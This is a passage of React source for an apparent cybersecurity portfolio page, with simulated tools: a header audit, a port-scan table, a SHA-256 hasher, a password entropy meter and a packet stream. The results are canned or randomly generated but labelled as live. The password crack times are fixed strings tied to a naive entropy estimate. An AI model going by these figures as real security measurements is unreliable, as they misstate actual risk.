        { name: "Referrer-Policy", value: "strict-origin-when-cross-origin", status: "PASS", desc: "Hides sensitive token paths from outgoing referrer logs" },
        { name: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()", status: "PASS", desc: "Disables unauthorized hardware sensor access" },
      ],
    },
    standard: {
      name: "Standard SaaS Portal (modern-webapp.dev)",
      score: 68,
      grade: "B",
      color: "#f59e0b",
      headers: [
        { name: "Content-Security-Policy", value: "MISSING (Header Not Declared)", status: "FAIL", desc: "Risk of inline script execution and unauthorized asset loading" },
        { name: "Strict-Transport-Security (HSTS)", value: "max-age=31536000", status: "PASS", desc: "Enforces HTTPS without preloading subdomains" },
        { name: "X-Frame-Options", value: "SAMEORIGIN", status: "PASS", desc: "Restricts framing to matching origin" },
        { name: "X-Content-Type-Options", value: "nosniff", status: "PASS", desc: "MIME sniffing disabled" },
        { name: "Referrer-Policy", value: "no-referrer-when-downgrade", status: "WARN", desc: "Sub-optimal: reveals full path to third-party endpoints" },
        { name: "Permissions-Policy", value: "MISSING", status: "FAIL", desc: "Browser APIs remain unrestricted" },
      ],
    },
    legacy: {
      name: "Vulnerable Legacy Gateway (legacy-portal.local)",
      score: 28,
      grade: "F",
      color: "#ef4444",
      headers: [
        { name: "Content-Security-Policy", value: "MISSING", status: "FAIL", desc: "Critical vulnerability: Unrestricted script execution" },
        { name: "Strict-Transport-Security", value: "MISSING", status: "FAIL", desc: "Vulnerable to SSL stripping & MitM downgrades" },
        { name: "X-Frame-Options", value: "MISSING", status: "FAIL", desc: "Vulnerable to Clickjacking overlay manipulation" },
        { name: "X-Content-Type-Options", value: "MISSING", status: "FAIL", desc: "Vulnerable to executable MIME confusion" },
        { name: "Referrer-Policy", value: "unsafe-url", status: "FAIL", desc: "Leaking internal API tokens in plaintext Referrer header" },
        { name: "Permissions-Policy", value: "MISSING", status: "FAIL", desc: "Zero device access restrictions" },
      ],
    },
  };

  // 3. Port & Service Recon Scanner State
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(100);
  const [scanTargetIp, setScanTargetIp] = useState("192.168.1.108");
  const discoveredPorts = [
    { port: 21, proto: "TCP", service: "FTP", banner: "vsftpd 2.3.4 (Backdoor Alert)", status: "ALERT", cvss: "9.8 CRITICAL", color: "#ef4444", action: "Upgrade to vsftpd 3.0+ or disable legacy FTP for SFTP." },
    { port: 22, proto: "TCP", service: "SSH", banner: "OpenSSH 8.9p1 (CVE-2024-6387)", status: "AUDITED", cvss: "SECURE", color: "#10b981", action: "Patched against regreSSHion signal race condition." },
    { port: 80, proto: "TCP", service: "HTTP", banner: "Nginx 1.24 (Redirect 301)", status: "HARDENED", cvss: "SAFE", color: "#10b981", action: "Auto-upgraded to TLSv1.3 on 443." },
    { port: 443, proto: "TCP", service: "HTTPS", banner: "Nginx / OpenSSL 3.0.13", status: "SECURE", cvss: "A+ GRADE", color: "#10b981", action: "TLS 1.3 negotiated with ECDHE-RSA-AES256-GCM-SHA384." },
    { port: 445, proto: "TCP", service: "SMB", banner: "Microsoft-DS / Samba", status: "FILTERED", cvss: "CLOSED", color: "#60a5fa", action: "SMBv1 disabled; protected against MS17-010 EternalBlue." },
    { port: 8080, proto: "TCP", service: "App Dev", banner: "Spring Boot 3.2.3", status: "AUDITED", cvss: "SECURE", color: "#10b981", action: "Spring4Shell and Log4Shell mitigation verified." },
  ];

  const handleRunScan = () => {
    playSound("click", soundEnabled);
    setIsScanning(true);
    setScanProgress(0);
    let p = 0;
    const interval = setInterval(() => {
      p += 10;
      setScanProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setIsScanning(false);
        playSound("click", soundEnabled);
      }
    }, 100);
  };

  // 4. Cryptographic Hash Analyzer State
  const [cryptoInput, setCryptoInput] = useState("CyberSecurity@2026!Nihar");
  const [liveSha256, setLiveSha256] = useState("");
  const [copiedHash, setCopiedHash] = useState(false);

  useEffect(() => {
    let isCancelled = false;
    async function computeHash() {
      if (!cryptoInput) {
        setLiveSha256("");
        return;
      }
      try {
        const msgUint8 = new TextEncoder().encode(cryptoInput);
        const hashBuffer = await window.crypto.subtle.digest("SHA-256", msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
        if (!isCancelled) {
          setLiveSha256(hashHex);
        }
      } catch (err) {
        if (!isCancelled) {
          setLiveSha256("Error calculating hash");
        }
      }
    }
    computeHash();
    return () => {
      isCancelled = true;
    };
  }, [cryptoInput]);

  const hashAnalysis = useMemo(() => {
    const trimmed = cryptoInput.trim();
    if (/^[a-f0-9]{32}$/i.test(trimmed)) {
      return {
        type: "MD5 / NTLM Hash",
        bits: "128 bits",
        security: "BROKEN",
        statusColor: "#ef4444",
        verdict: "Vulnerable to collision attacks & instant Rainbow Table lookup. Insecure for passwords.",
      };
    }
    if (/^[a-f0-9]{40}$/i.test(trimmed)) {
      return {
        type: "SHA-1 Hash",
        bits: "160 bits",
        security: "DEPRECATED",
        statusColor: "#f59e0b",
        verdict: "SHAttered collision demonstrated. Deprecated by NIST for cryptographic signatures.",
      };
    }
    if (/^[a-f0-9]{64}$/i.test(trimmed)) {
      return {
        type: "SHA-256 (SHA-2 Family)",
        bits: "256 bits",
        security: "STRONG",
        statusColor: "#10b981",
        verdict: "NIST FIPS 180-4 standard. Approved for military, banking & TLS cryptographic integrity.",
      };
    }
    if (trimmed.startsWith("$2a$") || trimmed.startsWith("$2b$") || trimmed.startsWith("$2y$")) {
      return {
        type: "bcrypt Password Hash",
        bits: "Adaptive Cost",
        security: "HARDENED",
        statusColor: "#10b981",
        verdict: "Built-in salt & configurable key derivation iterations. Highly resistant to GPU brute-force.",
      };
    }
    return {
      type: "Plaintext String Candidate",
      bits: `${cryptoInput.length * 8} bits (Raw Input)`,
      security: "LIVE HASHING",
      statusColor: "#3b82f6",
      verdict: "Generating real-time SHA-256 cryptographic digest via browser Web Crypto API.",
    };
  }, [cryptoInput]);

  const handleCopyHash = () => {
    playSound("click", soundEnabled);
    navigator.clipboard?.writeText(liveSha256);
    setCopiedHash(true);
    setTimeout(() => setCopiedHash(false), 2000);
  };

  return (
    <div className="security-suite-wrap">
      {/* Test Tabs Bar */}
      <div className="suite-nav-tabs">
        <button
          type="button"
          className={`suite-tab-btn ${activeTab === "waf" ? "active" : ""}`}
          onClick={() => { playSound("click", soundEnabled); setActiveTab("waf"); }}
        >
          <ShieldWarning size={16} weight="bold" />
          <span>WAF & Injection Defense</span>
        </button>
        <button
          type="button"
          className={`suite-tab-btn ${activeTab === "headers" ? "active" : ""}`}
          onClick={() => { playSound("click", soundEnabled); setActiveTab("headers"); }}
        >
          <ShieldCheck size={16} weight="bold" />
          <span>HTTP Headers & SSL Audit</span>
        </button>
        <button
          type="button"
          className={`suite-tab-btn ${activeTab === "scanner" ? "active" : ""}`}
          onClick={() => { playSound("click", soundEnabled); setActiveTab("scanner"); }}
        >
          <MagnifyingGlass size={16} weight="bold" />
          <span>Port & CVE Service Recon</span>
        </button>
        <button
          type="button"
          className={`suite-tab-btn ${activeTab === "crypto" ? "active" : ""}`}
          onClick={() => { playSound("click", soundEnabled); setActiveTab("crypto"); }}
        >
          <LockKey size={16} weight="bold" />
          <span>WebCrypto Hasher</span>
        </button>
      </div>

      {/* Tab Panels */}
      <div className="suite-panel-body">
        {/* TAB 1: WAF */}
        {activeTab === "waf" && (
          <div className="suite-pane-content">
            <div className="suite-pane-header">
              <div>
                <h3>🛡️ Web Application Firewall & Injection Defense Simulator</h3>
                <p>Simulate hostile SQLi, XSS, RCE, and Path Traversal attack vectors against real-time regex inspection filters.</p>
              </div>
            </div>

            <div className="waf-presets-row">
              <span className="preset-label">Test Vectors:</span>
              <div className="waf-preset-chips">
                {wafPresets.map((p) => (
                  <button
                    key={p.label}
                    type="button"
                    className={`waf-chip ${payloadInput === p.payload ? "active" : ""}`}
                    onClick={() => { playSound("click", soundEnabled); setPayloadInput(p.payload); }}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="waf-input-box">
              <label className="suite-label" htmlFor="waf-payload">Payload Input String:</label>
              <input
                id="waf-payload"
                type="text"
                className="suite-input font-mono"
                value={payloadInput}
                onChange={(e) => setPayloadInput(e.target.value)}
                placeholder="Enter attack payload or raw query string..."
              />
            </div>

            <div className="waf-verdict-grid">
              <div className="waf-verdict-card">
                <span className="verdict-sub">Filter Verdict</span>
                <div className="verdict-badge" style={{ backgroundColor: `${wafVerdict.color}20`, color: wafVerdict.color, borderColor: wafVerdict.color }}>
                  {wafVerdict.status}
                </div>
                <div className="verdict-meta">
                  <span><strong>Threat Level:</strong> <span style={{ color: wafVerdict.color }}>{wafVerdict.risk}</span></span>
                  <span><strong>Classification:</strong> {wafVerdict.cwe}</span>
                  <span><strong>Triggered Rule:</strong> <code>{wafVerdict.rule}</code></span>
                </div>
              </div>

              <div className="waf-sanitized-card">
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span className="verdict-sub">Sanitized Defused Output</span>
                  <button type="button" className="copy-btn" onClick={handleCopySanitized}>
                    {copiedSanitized ? <Check size={12} weight="bold" /> : <Copy size={12} />}
                    {copiedSanitized ? "Copied" : "Copy"}
                  </button>
                </div>
                <pre className="waf-code-preview font-mono">{wafVerdict.sanitized || "(empty)"}</pre>
                <p className="waf-mitigation-note">
                  <strong>💡 Defense Recommendation:</strong> {wafVerdict.mitigation}
                </p>
              </div>
            </div>
          </div>
        )}

        {/* TAB 2: HEADERS */}
        {activeTab === "headers" && (
          <div className="suite-pane-content">
            <div className="suite-pane-header">
              <div>
                <h3>🔒 HTTP Security Headers & TLS Posture Audit</h3>
                <p>Examine server response headers for modern browser security defenses against MitM, Clickjacking, and XSS.</p>
              </div>
              <div className="target-select-pills">
                <button
                  type="button"
                  className={`target-pill ${headerTarget === "hardened" ? "active" : ""}`}
                  onClick={() => { playSound("click", soundEnabled); setHeaderTarget("hardened"); }}
                >
                  Hardened Vault (A+)
                </button>
                <button
                  type="button"
                  className={`target-pill ${headerTarget === "standard" ? "active" : ""}`}
                  onClick={() => { playSound("click", soundEnabled); setHeaderTarget("standard"); }}
                >
                  Standard SaaS (B)
                </button>
                <button
                  type="button"
                  className={`target-pill ${headerTarget === "legacy" ? "active" : ""}`}
                  onClick={() => { playSound("click", soundEnabled); setHeaderTarget("legacy"); }}
                >
                  Legacy Portal (F)
                </button>
              </div>
            </div>

            <div className="header-score-banner" style={{ borderColor: `${headerPresets[headerTarget].color}40`, background: `${headerPresets[headerTarget].color}10` }}>
              <div className="score-grade" style={{ color: headerPresets[headerTarget].color }}>
                {headerPresets[headerTarget].grade}
              </div>
              <div>
                <h4>{headerPresets[headerTarget].name}</h4>
                <p>Security Posture Score: <strong>{headerPresets[headerTarget].score}/100</strong> • Evaluated on 6 Critical OWASP & NIST Headers</p>
              </div>
            </div>

            <div className="headers-table-wrap">
              <table className="suite-table">
                <thead>
                  <tr>
                    <th>Header Directive</th>
                    <th>Status</th>
                    <th>Configured Value</th>
                    <th>Risk Analysis</th>
                  </tr>
                </thead>
                <tbody>
                  {headerPresets[headerTarget].headers.map((h) => (
                    <tr key={h.name}>
                      <td className="font-mono font-bold">{h.name}</td>
                      <td>
                        <span className={`status-pill status-${h.status.toLowerCase()}`}>
                          {h.status}
                        </span>
                      </td>
                      <td className="font-mono value-cell">{h.value}</td>
                      <td className="desc-cell">{h.desc}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* TAB 3: SCANNER */}
        {activeTab === "scanner" && (
          <div className="suite-pane-content">
            <div className="suite-pane-header">
              <div>
                <h3>🔍 Port Recon & Service Vulnerability Scanner</h3>
                <p>Simulate reconnaissance probes across active TCP services, verifying service banners and known CVE exploits.</p>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "10px", flexWrap: "wrap" }}>
                <input
                  type="text"
                  className="suite-input-sm font-mono"
                  value={scanTargetIp}
                  onChange={(e) => setScanTargetIp(e.target.value)}
                  placeholder="Target IP..."
                />
                <button
                  type="button"
                  className="button button-primary button-small"
                  onClick={handleRunScan}
                  disabled={isScanning}
                >
                  {isScanning ? (
                    <>
                      <ArrowsClockwise size={14} className="spin-animate" /> Scanning...
                    </>
                  ) : (
                    <>
                      <Play size={14} weight="fill" /> Run Port Scan
                    </>
                  )}
                </button>
              </div>
            </div>

            {isScanning && (
              <div className="scan-progress-wrap">
                <div className="scan-progress-bar" style={{ width: `${scanProgress}%` }} />
              </div>
            )}

            <div className="headers-table-wrap">
              <table className="suite-table">
                <thead>
                  <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Service Banner / Version</th>
                    <th>Audited Status</th>
                    <th>CVSS Rating</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {discoveredPorts.map((p) => (
                    <tr key={p.port}>
                      <td className="font-mono font-bold">{p.port}/{p.proto}</td>
                      <td className="font-bold">{p.service}</td>
                      <td className="font-mono value-cell">{p.banner}</td>
                      <td>
                        <span className="status-pill" style={{ backgroundColor: `${p.color}20`, color: p.color, borderColor: p.color }}>
                          {p.status}
                        </span>
                      </td>
                      <td>
                        <span className="font-mono font-bold" style={{ color: p.color }}>{p.cvss}</span>
                      </td>
                      <td className="desc-cell">{p.action}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* TAB 4: CRYPTO */}
        {activeTab === "crypto" && (
          <div className="suite-pane-content">
            <div className="suite-pane-header">
              <div>
                <h3>⚡ WebCrypto Cryptographic Hasher & Entropy Inspector</h3>
                <p>Compute browser-native SHA-256 cryptographic digests in real time and inspect hash algorithm resilience.</p>
              </div>
            </div>

            <div className="waf-input-box">
              <label className="suite-label" htmlFor="crypto-input">Plaintext Input or Existing Hash Candidate:</label>
              <input
                id="crypto-input"
                type="text"
                className="suite-input font-mono"
                value={cryptoInput}
                onChange={(e) => setCryptoInput(e.target.value)}
                placeholder="Type text to hash or paste MD5/SHA/bcrypt hash..."
              />
            </div>

            <div className="waf-verdict-grid">
              <div className="waf-verdict-card">
                <span className="verdict-sub">Algorithm Identification</span>
                <div className="verdict-badge" style={{ backgroundColor: `${hashAnalysis.statusColor}20`, color: hashAnalysis.statusColor, borderColor: hashAnalysis.statusColor }}>
                  {hashAnalysis.security}
                </div>
                <div className="verdict-meta">
                  <span><strong>Identified Type:</strong> {hashAnalysis.type}</span>
                  <span><strong>Bit-Length / Complexity:</strong> {hashAnalysis.bits}</span>
                  <span><strong>Evaluation:</strong> {hashAnalysis.verdict}</span>
                </div>
              </div>

              <div className="waf-sanitized-card">
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span className="verdict-sub">Real-Time SHA-256 Digest (Web Crypto API)</span>
                  <button type="button" className="copy-btn" onClick={handleCopyHash} disabled={!liveSha256}>
                    {copiedHash ? <Check size={12} weight="bold" /> : <Copy size={12} />}
                    {copiedHash ? "Copied" : "Copy"}
                  </button>
                </div>
                <pre className="waf-code-preview font-mono" style={{ wordBreak: "break-all", whiteSpace: "pre-wrap" }}>
                  {liveSha256 || "(computing...)"}
                </pre>
                <p className="waf-mitigation-note">
                  <strong>🔒 Standards Compliance:</strong> 256-bit collision-resistant output generated natively using client-side <code>window.crypto.subtle</code> without third-party telemetry.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// Unique Feature 1: Password Resilience & Entropy Lab Component
function EntropyLab({ soundEnabled }) {
  const [password, setPassword] = useState("N1har#CyberDef3nse2026!");
  const [showPassword, setShowPassword] = useState(false);
  const [copied, setCopied] = useState(false);

  const samplePassphrases = [
    "Sentinel#Guard@2026!Sec",
    "zero-knowledge-argon2id-vault",
    "bpf-packet-entropy-scapy-99",
    "N1har#CyberDef3nse2026!",
    "cyfen-labs-autonomous-gec",
  ];

  const generatePassphrase = () => {
    playSound("click", soundEnabled);
    const chosen = samplePassphrases[Math.floor(Math.random() * samplePassphrases.length)];
    const salt = Math.floor(100 + Math.random() * 900);
    setPassword(`${chosen}-${salt}!`);
  };

  const copyPassword = () => {
    playSound("success", soundEnabled);
    navigator.clipboard.writeText(password);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const analysis = useMemo(() => {
    const len = password.length;
    let pool = 0;
    const hasLower = /[a-z]/.test(password);
    const hasUpper = /[A-Z]/.test(password);
    const hasNumber = /[0-9]/.test(password);
    const hasSymbol = /[^a-zA-Z0-9]/.test(password);

    if (hasLower) pool += 26;
    if (hasUpper) pool += 26;
    if (hasNumber) pool += 10;
    if (hasSymbol) pool += 33;

    const entropy = pool > 0 && len > 0 ? Math.round(len * (Math.log(pool) / Math.log(2))) : 0;

    let tier = "Critical";
    let color = "#ef4444";
    let crackTime = "Instant (< 0.01s)";
    let percentage = Math.min(100, Math.round((entropy / 100) * 100));

    if (entropy < 35) {
      tier = "Vulnerable 🔴";
      color = "#ef4444";
      crackTime = "Instant (< 0.01s)";
    } else if (entropy < 55) {
      tier = "Moderate 🟡";
      color = "#f59e0b";
      crackTime = "4.2 hours on 8x RTX 4090";
    } else if (entropy < 75) {
      tier = "Resilient 🟢";
      color = "#10b981";
      crackTime = "120 years on distributed cluster";
    } else {
      tier = "Military Fortified 🟣";
      color = "#8b5cf6";
      crackTime = "3.8 billion years (Heat-Death Proof 🌌)";
    }

    return {
      entropy,
      tier,
      color,
      crackTime,
      percentage,
      len,
      hasLower,
      hasUpper,
      hasNumber,
      hasSymbol,
      isLongEnough: len >= 12,
    };
  }, [password]);

  return (
    <div className="entropy-box">
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
        <div>
          <span className="academic-badge" style={{ fontSize: "10px" }}>🛡️ Cryptographic Entropy Engine</span>
          <h3 style={{ margin: "6px 0 2px", fontSize: "19px", color: "var(--heading-color)" }}>
            Password Resilience & Entropy Lab
          </h3>
          <p style={{ margin: 0, fontSize: "12px", color: "var(--para-gray-color)" }}>
            Measure real-time Shannon entropy bits, character diversity, and offline GPU cluster crack times.
          </p>
        </div>
        <div style={{ display: "flex", gap: "8px" }}>
          <button type="button" className="entropy-btn" onClick={generatePassphrase}>
            <DiceFive size={15} /> Generate High-Entropy 🎲
          </button>
        </div>
      </div>

      <div className="entropy-input-wrap">
        <input
          type={showPassword ? "text" : "password"}
          className="entropy-input"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Type or test any passphrase..."
          aria-label="Passphrase input"
        />
        <button
          type="button"
          className="dock-item"
          onClick={() => setShowPassword((prev) => !prev)}
          title={showPassword ? "Hide password" : "Show password"}
          style={{ width: "32px", height: "32px" }}
        >
          {showPassword ? <EyeSlash size={16} /> : <Eye size={16} />}
        </button>
        <button
          type="button"
          className="entropy-btn"
          onClick={copyPassword}
          title="Copy to clipboard"
        >
          {copied ? <Check size={14} weight="bold" /> : <Copy size={14} />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>

      <div>
        <div style={{ display: "flex", justifyContent: "space-between", fontSize: "12px", fontWeight: 700, marginBottom: "6px" }}>
          <span>Entropy Rating: <strong style={{ color: analysis.color }}>{analysis.tier}</strong></span>
          <span style={{ fontFamily: "monospace", color: analysis.color }}>{analysis.entropy} bits / 100+</span>
        </div>
        <div className="entropy-bar-track">
          <div
            className="entropy-bar-fill"
            style={{ width: `${analysis.percentage}%`, backgroundColor: analysis.color }}
          />
        </div>
      </div>

      <div className="entropy-stats-grid">
        <div className="entropy-stat-card">
          <span className="entropy-stat-label">Shannon Entropy</span>
          <span className="entropy-stat-val" style={{ color: analysis.color }}>{analysis.entropy} bits</span>
          <span className="entropy-stat-sub">Log2 search space depth</span>
        </div>
        <div className="entropy-stat-card">
          <span className="entropy-stat-label">RTX 4090 Crack Time</span>
          <span className="entropy-stat-val" style={{ fontSize: "13px" }}>{analysis.crackTime}</span>
          <span className="entropy-stat-sub">100B hash/sec brute-force</span>
        </div>
        <div className="entropy-stat-card">
          <span className="entropy-stat-label">Length & Density</span>
          <span className="entropy-stat-val">{analysis.len} chars</span>
          <span className="entropy-stat-sub">{analysis.len >= 14 ? "Optimal NIST length" : "Recommend >= 14"}</span>
        </div>
        <div className="entropy-stat-card">
          <span className="entropy-stat-label">Defense Posture</span>
          <span className="entropy-stat-val" style={{ color: analysis.color }}>{analysis.entropy >= 60 ? "Resilient" : "Sub-Optimal"}</span>
          <span className="entropy-stat-sub">Zero-knowledge ready</span>
        </div>
      </div>

      <div className="entropy-factors">
        <span className={`entropy-factor-pill ${analysis.isLongEnough ? "active" : ""}`}>
          {analysis.isLongEnough ? "✓" : "✗"} 12+ Chars (Length)
        </span>
        <span className={`entropy-factor-pill ${analysis.hasLower ? "active" : ""}`}>
          {analysis.hasLower ? "✓" : "✗"} a-z (Lowercase)
        </span>
        <span className={`entropy-factor-pill ${analysis.hasUpper ? "active" : ""}`}>
          {analysis.hasUpper ? "✓" : "✗"} A-Z (Uppercase)
        </span>
        <span className={`entropy-factor-pill ${analysis.hasNumber ? "active" : ""}`}>
          {analysis.hasNumber ? "✓" : "✗"} 0-9 (Numeric)
        </span>
        <span className={`entropy-factor-pill ${analysis.hasSymbol ? "active" : ""}`}>
          {analysis.hasSymbol ? "✓" : "✗"} !@#$%^ (Symbols)
        </span>
      </div>
    </div>
  );
}

// Unique Feature 2: Live Simulated Packet Sniffer Stream
function PacketStream({ soundEnabled }) {
  const [filter, setFilter] = useState("ALL");
  const [isPaused, setIsPaused] = useState(false);
  const [packets, setPackets] = useState([
    {
      id: 1,
      time: "21:19:14.204",
      proto: "TCP",
      src: "192.168.1.104:54320",
      dst: "10.0.0.1:443",
      info: "[SYN] Seq=0 Win=65535 MSS=1460 WS=64",
      threat: "clean",
    },
    {
      id: 2,
      time: "21:19:15.012",
      proto: "DNS",
      src: "192.168.1.104:60112",
      dst: "8.8.8.8:53",
      info: "Standard query 0x7a10 A gec.ac.in",
      threat: "clean",
    },
    {
      id: 3,
      time: "21:19:15.845",
      proto: "TLS",
      src: "10.0.0.15:443",
      dst: "192.168.1.104:54320",
      info: "TLSv1.3 Handshake ServerHello [AES_256_GCM]",
      threat: "clean",
    },
    {
      id: 4,
      time: "21:19:16.421",
      proto: "ICMP",
      src: "20.29.61.85",
      dst: "192.168.1.1",
      info: "Echo (ping) request id=0x0042 seq=1 ttl=64",
      threat: "clean",
    },
    {
      id: 5,
      time: "21:19:17.110",
      proto: "TCP",
      src: "45.154.255.88:4112",
      dst: "192.168.1.104:22",
      info: "[SYN] Port sweep probe detected",
      threat: "alert",
    },
    {
      id: 6,
      time: "21:19:18.005",
      proto: "HTTP",
      src: "192.168.1.104:54330",
      dst: "10.0.0.1:8080",
      info: "GET /api/v1/telemetry HTTP/1.1 200 OK",
      threat: "clean",
    },
  ]);

  const pool = useRef([
    { proto: "TCP", src: "192.168.1.104:54344", dst: "10.0.0.1:443", info: "[ACK] Seq=145 Ack=892 Win=131072", threat: "clean" },
    { proto: "DNS", src: "192.168.1.104:59811", dst: "1.1.1.1:853", info: "DNS over TLS query AAAA cyfen.in", threat: "clean" },
    { proto: "TLS", src: "10.0.0.1:443", dst: "192.168.1.104:54344", info: "Application Data Protocol [Encrypted]", threat: "clean" },
    { proto: "ICMP", src: "8.8.8.8", dst: "192.168.1.104", info: "Echo (ping) reply id=0x0042 seq=1", threat: "clean" },
    { proto: "SSH", src: "192.168.1.104:52210", dst: "10.0.0.5:22", info: "SSH-2.0-OpenSSH_9.6p1 Key Exchange", threat: "clean" },
    { proto: "TCP", src: "185.220.101.5:44321", dst: "192.168.1.104:80", info: "[RST, ACK] Malformed header heuristic", threat: "inspect" },
    { proto: "TCP", src: "198.51.100.12:9001", dst: "192.168.1.104:443", info: "High-entropy binary burst payload", threat: "alert" },
  ]);

  useEffect(() => {
    if (isPaused) return;
    const interval = setInterval(() => {
      const randomItem = pool.current[Math.floor(Math.random() * pool.current.length)];
      const now = new Date();
      const timeStr = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}.${String(now.getMilliseconds()).padStart(3, "0")}`;
      const newPacket = {
        id: Date.now() + Math.random(),
        time: timeStr,
        ...randomItem,
      };
      setPackets((prev) => [newPacket, ...prev.slice(0, 24)]);
    }, 2200);

    return () => clearInterval(interval);
  }, [isPaused]);

  const filteredPackets = useMemo(() => {
    if (filter === "ALL") return packets;
    return packets.filter((p) => p.proto === filter);
  }, [filter, packets]);

  const handleClear = () => {
    playSound("click", soundEnabled);
    setPackets([]);
  };

  const handleTogglePause = () => {
    playSound("click", soundEnabled);
    setIsPaused((p) => !p);
  };

  return (
    <div className="packet-stream-window">
      <div className="packet-stream-header">
        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
          <span className="live-led" style={{ background: isPaused ? "#f59e0b" : "#10b981", boxShadow: isPaused ? "0 0 8px #f59e0b" : "0 0 8px #10b981" }} />
          <span style={{ fontSize: "12px", fontWeight: 700, letterSpacing: "0.5px" }}>
            LIVE BPF PACKET CAPTURE STREAM // eth0 (SentinelGuard Engine)
          </span>
          <span style={{ fontSize: "10px", color: "#64748b" }}>
            ({packets.length} triaged)
          </span>
        </div>
        <div className="packet-stream-controls">
          <button
            type="button"
            className="packet-filter-btn"
            onClick={handleTogglePause}
            title={isPaused ? "Resume packet stream" : "Pause packet stream"}
          >
            {isPaused ? <Play size={12} weight="fill" /> : <Pause size={12} weight="fill" />}
            {isPaused ? "Resume" : "Pause"}
          </button>
          <button
            type="button"
            className="packet-filter-btn"
            onClick={handleClear}
            title="Clear capture buffer"
          >
            <Trash size={12} /> Clear
          </button>
        </div>
      </div>

      <div className="packet-filter-tabs">
        <span style={{ fontSize: "10px", color: "#64748b", textTransform: "uppercase" }}>Filter:</span>
        {["ALL", "TCP", "DNS", "TLS", "ICMP", "HTTP", "SSH"].map((proto) => (
          <button
            key={proto}
            type="button"
            className={`packet-filter-btn ${filter === proto ? "active" : ""}`}
            onClick={() => {
              playSound("click", soundEnabled);
              setFilter(proto);
            }}
          >
            {proto}
          </button>
        ))}
      </div>

      <div className="packet-table-wrap">
        <table className="packet-table">
          <thead>
            <tr>
              <th style={{ width: "95px" }}>TIME</th>
              <th style={{ width: "55px" }}>PROTO</th>
              <th style={{ width: "230px" }}>SOURCE → DEST</th>
              <th>PACKET INFO & FLAGS</th>
              <th style={{ width: "90px" }}>STATUS</th>
            </tr>
          </thead>
          <tbody>
            {filteredPackets.map((pkt) => (
              <tr key={pkt.id} className="packet-row">
                <td style={{ color: "#94a3b8" }}>{pkt.time}</td>
                <td>
                  <span className={`proto-tag proto-${pkt.proto.toLowerCase()}`}>
                    {pkt.proto}
                  </span>
                </td>
                <td style={{ color: "#cbd5e1" }}>{pkt.src} → {pkt.dst}</td>
                <td style={{ color: "#f8fafc" }}>{pkt.info}</td>
                <td>
                  <span className={`threat-tag threat-${pkt.threat}`}>
                    {pkt.threat === "clean" && "CLEAN 🟢"}
                    {pkt.threat === "inspect" && "INSPECT 🟡"}
                    {pkt.threat === "alert" && "ALERT 🚨"}
                  </span>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// Unique Feature 3: Floating System Quick Dock Component
function FloatingDock({ theme, toggleTheme, soundEnabled, toggleSound, isAmbient, toggleAmbient }) {
  const scrollToTop = () => {
    playSound("click", soundEnabled);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  return (
    <nav className="floating-quick-dock" aria-label="Quick Actions Dock">
      <Link to="/" className="dock-item" title="Home 🏠" onClick={() => playSound("click", soundEnabled)}>
        🏠
      </Link>
      <Link to="/projects" className="dock-item" title="Deployments 🚀" onClick={() => playSound("click", soundEnabled)}>
        🚀
      </Link>
      <a href="/#security-tests" className="dock-item" title="Security Tests Lab 🧪" onClick={() => playSound("click", soundEnabled)}>
        🧪
      </a>
      <a href="/#equipment" className="dock-item" title="Equipment Arsenal 🛠️" onClick={() => playSound("click", soundEnabled)}>
        🛠️
      </a>
      <a href="/#entropy-lab" className="dock-item" title="Entropy Lab 🛡️" onClick={() => playSound("click", soundEnabled)}>
        🛡️
      </a>
      <a href="/#packet-stream" className="dock-item" title="Packet Stream 📡" onClick={() => playSound("click", soundEnabled)}>
        📡
      </a>
      <a href="/#terminal" className="dock-item" title="Terminal Console 💻" onClick={() => playSound("click", soundEnabled)}>
        💻
      </a>
      <div className="dock-divider" />
      <button
        type="button"
        className="dock-item"
        onClick={toggleAmbient}
        title={isAmbient ? "Pause Ambient Cyber Focus Synth" : "Play Ambient Cyber Focus Synth"}
      >
        🎧
        {isAmbient && <span className="dock-badge-pulse" />}
      </button>
      <button
        type="button"
        className="dock-item"
        onClick={toggleTheme}
        title={theme === "dark" ? "Switch to Light Mode ☀️" : "Switch to Dark Mode 🌙"}
      >
        {theme === "dark" ? "☀️" : "🌙"}
      </button>
      <button
        type="button"
        className="dock-item"
        onClick={scrollToTop}
        title="Scroll to Top ⬆️"
      >
        <ArrowUp size={15} weight="bold" />
      </button>
    </nav>
  );
}

function HomePage({ soundEnabled, isAmbient, toggleAmbient }) {
  const [skillCategory, setSkillCategory] = useState("All");
  const focusItems = [
    "Cyber Security Specialist",
    "Computer Science Engineer",
    "Ethical Defense & Scapy",
    "Full-Stack Developer",
  ];

  const filteredSkillGroups = useMemo(() => {
    if (skillCategory === "All") return skillGroups;
    return skillGroups.filter((g) => g.category === skillCategory);
  }, [skillCategory]);

  return (
    <>
      {/* Hero Section */}
      <section className="hero container">
        <div className="hero-copy">
          <Reveal>
            {/* Interactive Ambient Cyber Focus Soundwave */}
            <div
              className="status-badge-row"
              onClick={toggleAmbient}
              style={{ cursor: "pointer" }}
